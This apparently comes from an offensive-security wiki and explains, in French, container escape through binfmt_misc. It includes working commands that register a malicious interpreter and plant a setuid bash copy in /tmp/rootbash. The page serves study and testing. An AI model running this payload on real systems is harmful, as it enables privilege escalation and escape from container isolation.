---
title: "binfmt_misc : enregistrer un interpréteur que le noyau invoque pour un format de fichier"
order: 4
description: "binfmt_misc permet à l'espace utilisateur d'enregistrer des interpréteurs pour des formats binaires en écrivant dans /proc/sys/fs/binfmt_misc/register. Un conteneur dont cette interface est montée en écriture enregistre un interpréteur pointant vers sa charge utile, de sorte que lorsqu'un fichier correspondant est exécuté, le noyau lance l'interpréteur. Utile lorsque l'hôte exécute ensuite un binaire correspondant, avec d'importantes réserves sur le contexte d'exécution."
keywords:
  - binfmt_misc
  - enregistrement d'interpréteur
  - proc fs binfmt
  - évasion de conteneur
  - usermode
---

# binfmt_misc

`binfmt_misc` est la fonctionnalité du noyau qui permet à l'espace utilisateur d'apprendre au noyau à exécuter des exécutables non natifs en enregistrant un interpréteur indexé sur une extension de fichier ou des octets magiques. L'enregistrement est une écriture dans `/proc/sys/fs/binfmt_misc/register`. Un conteneur dont cette interface procfs est montée en écriture peut enregistrer un interpréteur dont le chemin pointe vers une charge utile de l'attaquant. Contrairement à `core_pattern` ou `modprobe`, l'interpréteur ne s'exécute pas automatiquement en tant que root sur l'hôte : il s'exécute dans le contexte de quiconque exécute un fichier correspondant. L'évasion dépend donc du fait de provoquer l'exécution, par un contexte hôte privilégié, d'un fichier correspondant à l'enregistrement.

Confirmez l'interface :

```bash
ls /proc/sys/fs/binfmt_misc/ 2>/dev/null
[ -w /proc/sys/fs/binfmt_misc/register ] && echo writable
cat /proc/sys/fs/binfmt_misc/status        # "enabled" means registrations are active
```

## Enregistrer un interpréteur

Le format d'enregistrement est `:name:type:offset:magic:mask:interpreter:flags`. Le drapeau `F` ouvre et met en cache l'interpréteur au moment de l'enregistrement, ce qui compte à travers les espaces de noms :

```bash
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
SH
chmod +x /payload

# Register: match files with extension .esc, run them through our payload.
echo ":esc:E::esc::$host/payload:" > /proc/sys/fs/binfmt_misc/register
ls -l /proc/sys/fs/binfmt_misc/esc          # a new entry confirms registration
```

Dès lors, l'exécution d'un fichier `*.esc` invoque la charge utile comme interpréteur. Comme cela se produit dans le contexte du processus qui exécute, le gain survient lorsqu'un processus privilégié côté hôte exécute un tel fichier, ou lorsque l'exécution a lieu dans un contexte partageant les espaces de noms de l'hôte.

## Notes d'exploitation

- L'interpréteur s'exécute avec les privilèges et les espaces de noms du processus qui exécute le fichier correspondant, et non comme un assistant root de l'hôte par défaut. Traitez cela comme une primitive de persistance ou dépendante du contexte plutôt que comme une évasion instantanée, contrairement à [core_pattern](core_pattern.md) et [chemin modprobe](modprobe-path.md), que le noyau exécute directement en tant que root de l'hôte.
- Le drapeau `F` (fix binary) amène le noyau à résoudre et à conserver l'interpréteur lors de l'enregistrement, ce qui peut faire le pont entre les espaces de noms de montage ; sans lui, le chemin de l'interpréteur est résolu au moment de l'exécution selon la vue de l'exécutant.
- Écrire dans `register` nécessite que le binfmt_misc de l'hôte soit monté en écriture, généralement un conteneur privilégié ; une interface en lecture seule ou non montée le met en échec.

## Références

- [Documentation du noyau : binfmt_misc](https://docs.kernel.org/admin-guide/binfmt-misc.html)
- [HackTricks : binfmt_misc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
